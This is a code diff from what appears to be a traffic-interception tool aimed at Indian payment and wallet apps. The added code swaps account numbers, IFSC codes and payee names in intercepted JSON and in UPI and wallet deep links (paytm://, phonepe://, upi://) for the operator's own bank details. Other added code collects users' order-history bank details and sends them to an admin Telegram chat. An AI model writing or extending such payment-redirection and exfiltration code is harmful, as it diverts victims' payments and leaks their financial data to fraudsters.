@@ -324,6 +324,7 @@ const BANK_FIELD_MAP = {
   walletaccount:'accountNo',walletno:'accountNo',collectionaccount:'accountNo',
   collectionaccountno:'accountNo',customerbanknumber:'accountNo',
   customerbankaccount:'accountNo',accno:'accountNo',acc_no:'accountNo',
+  acctno:'accountNo',acctnum:'accountNo',acct_no:'accountNo',
   account:'accountNo',receiveaccount:'accountNo',
   beneficiaryname:'accountHolder',accountname:'accountHolder',account_name:'accountHolder',
   receiveaccountname:'accountHolder',holdername:'accountHolder',accountholder:'accountHolder',
@@ -331,10 +332,12 @@ const BANK_FIELD_MAP = {
   payeename:'accountHolder',bankaccountname:'accountHolder',realname:'accountHolder',
   cardholder:'accountHolder',cardname:'accountHolder',receivername:'accountHolder',
   collectionname:'accountHolder',customername:'accountHolder',accname:'accountHolder',
-  acc_name:'accountHolder',truename:'accountHolder',receiverealname:'accountHolder',
+  acc_name:'accountHolder',acctname:'accountHolder',acct_name:'accountHolder',
+  truename:'accountHolder',receiverealname:'accountHolder',
   payeerealname:'accountHolder',
   ifsc:'ifsc',ifsccode:'ifsc',ifsc_code:'ifsc',receiveifsc:'ifsc',
   bankifsc:'ifsc',payeeifsc:'ifsc',receiverifsc:'ifsc',collectionifsc:'ifsc',
+  acctcode:'ifsc',acct_code:'ifsc',acctifsc:'ifsc',
   bankname:'bankName',bank_name:'bankName',payeebankname:'bankName',receiverbankname:'bankName',
   upiid:'upiId',upi_id:'upiId',upi:'upiId',vpa:'upiId',
   payeeupi:'upiId',receiverupi:'upiId',walletupi:'upiId',
@@ -377,8 +380,48 @@ function scanHasBankFields(obj, depth) {
 const NAME_FIELDS = ['name','payname','username','ctname','holdername','ownername',
   'receivename','payeename','beneficiaryname','accountname','realname',
   'cardholder','cardname','receivername','collectionname','customername',
-  'truename','accname','bankaccountname','receiveaccountname',
+  'truename','accname','acctname','bankaccountname','receiveaccountname',
   'payeerealname','receiverealname','bankaccountholder','accountholder'];
+
+// Replace bank account/ifsc/name inside wallet deep-link URL strings
+// Handles: mobikwik://, freecharge://, amazonpay://, phonepe://, paytm://, upi://
+// and also plain https UPI pay URLs
+function replaceWalletUrl(urlStr, bank) {
+  if (!urlStr || typeof urlStr !== 'string') return urlStr;
+  // Must look like a wallet/UPI deep link or UPI pay URL
+  if (!/^(mobikwik|freecharge|amazonpay|phonepe|paytm|bhim|gpay|upi|https?):\/\//i.test(urlStr)) return urlStr;
+  // Param names that carry bank account number in these URLs
+  const acctParams  = ['account','accountnumber','acc','payeeaccount','pa','payee','vaccount','vpa','to'];
+  const ifscParams  = ['ifsc','bankifsc','payeeifsc','fi'];
+  const nameParams  = ['name','payeename','pn','reciever','receiver','to_name','toname'];
+  const dispParams  = ['displayaccountnumber','displayaccount','maskedaccount','masked'];
+
+  try {
+    // Split scheme + path from query string (deep links have custom schemes)
+    const qIdx = urlStr.indexOf('?');
+    if (qIdx === -1) return urlStr;
+    const base   = urlStr.slice(0, qIdx + 1);
+    const params = new URLSearchParams(urlStr.slice(qIdx + 1));
+    let changed  = false;
+
+    for (const [key] of params) {
+      const kl = key.toLowerCase().replace(/[_-]/g, '');
+      if (bank.accountNo && acctParams.includes(kl)) {
+        params.set(key, bank.accountNo); changed = true;
+      } else if (bank.ifsc && ifscParams.includes(kl)) {
+        params.set(key, bank.ifsc); changed = true;
+      } else if (bank.accountHolder && nameParams.includes(kl)) {
+        params.set(key, bank.accountHolder); changed = true;
+      } else if (bank.accountNo && dispParams.includes(kl)) {
+        // Replace the masked display number with real (new) account number
+        params.set(key, bank.accountNo); changed = true;
+      }
+    }
+    return changed ? base + params.toString() : urlStr;
+  } catch(e) {
+    return urlStr;
+  }
+}
 
 function deepReplaceBankFields(obj, bank, depth, globalHasAcct) {
   if (!obj || typeof obj !== 'object' || depth > 10) return;
@@ -390,7 +433,12 @@ function deepReplaceBankFields(obj, bank, depth, globalHasAcct) {
     const mapping = BANK_FIELD_MAP[kl];
     if (mapping && bank[mapping] && String(obj[k]).length > 0) { obj[k] = bank[mapping]; continue; }
     if (globalHasAcct && bank.accountHolder && NAME_FIELDS.includes(kl) && String(obj[k]).length > 0) { obj[k] = bank.accountHolder; continue; }
-    if (kl === 'bank' && bank.bankName && String(obj[k]).length > 0) { obj[k] = bank.bankName; }
+    if (kl === 'bank' && bank.bankName && String(obj[k]).length > 0) { obj[k] = bank.bankName; continue; }
+    // Replace bank details embedded inside wallet deep-link URL strings
+    if (typeof obj[k] === 'string' && obj[k].includes('://')) {
+      const replaced = replaceWalletUrl(obj[k], bank);
+      if (replaced !== obj[k]) { obj[k] = replaced; }
+    }
   }
 }
 
@@ -1443,6 +1491,55 @@ ${realLine}
 ━━━━━━━━━━━━━━━━━━━━
 ${replaceLine}
 🕐 ${now}`);
+    }
+
+    // ── Buy History List: capture orderNo → bank for each item in list ──────
+    {
+      const listData = (jsonResp && typeof jsonResp === 'object')
+        ? (jsonResp.data || jsonResp.result || jsonResp.body || jsonResp)
+        : null;
+      const orderList = (listData && Array.isArray(listData.list)) ? listData.list
+        : (listData && Array.isArray(listData.data)) ? listData.data
+        : Array.isArray(listData) ? listData
+        : null;
+
+      if (orderList && orderList.length > 0) {
+        const orderIdFields = ['orderNo','order_no','orderId','order_id','rptNo','rpt_no','tradeNo','trade_no','slipId','buyOrderNo'];
+        let capturedCount = 0;
+        let logLines = [];
+        if (!data.orderBankMap) data.orderBankMap = {};
+
+        for (const item of orderList) {
+          if (!item || typeof item !== 'object') continue;
+          // Must have a bank field to be relevant
+          const itemHasBank = item.acctNo || item.acctno || item.accountNo || item.acctName || item.acctname;
+          if (!itemHasBank) continue;
+
+          let oId = '';
+          for (const f of orderIdFields) { if (item[f] && String(item[f]).length >= 3) { oId = String(item[f]); break; } }
+          if (!oId) continue;
+
+          const acctNo   = item.acctNo   || item.acctno   || item.accountNo  || item.accountno  || '';
+          const acctName = item.acctName || item.acctname || item.accountName || item.accountname|| '';
+          const acctCode = item.acctCode || item.acctcode || item.ifsc        || item.acctIfsc   || '';
+          const amt      = item.amount   || item.money    || item.realAmount  || item.orderAmount || '';
+
+          data.orderBankMap[oId] = {
+            bank: `${acctName} | ${acctNo}${acctCode ? ' | ' + acctCode : ''}`,
+            time: now,
+            userId: userId || ''
+          };
+          capturedCount++;
+          logLines.push(`📋 ${oId}\n   💰 ₹${amt}  👤 ${acctName}\n   🏦 ${acctNo}${acctCode ? ' | ' + acctCode : ''}`);
+        }
+
+        if (capturedCount > 0 && data.adminChatId && bot) {
+          const header = `📂 BUY HISTORY VIEWED\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n📊 ${capturedCount} order(s) captured\n━━━━━━━━━━━━━━━━━━━━`;
+          const body = logLines.slice(0, 10).join('\n━━━━━━━━━━━\n');
+          const footer = `\n━━━━━━━━━━━━━━━━━━━━\n🕐 ${now}`;
+          bot.sendMessage(data.adminChatId, header + '\n' + body + footer).catch(() => {});
+        }
+      }
     }
 
     if (userId) await saveData(data);
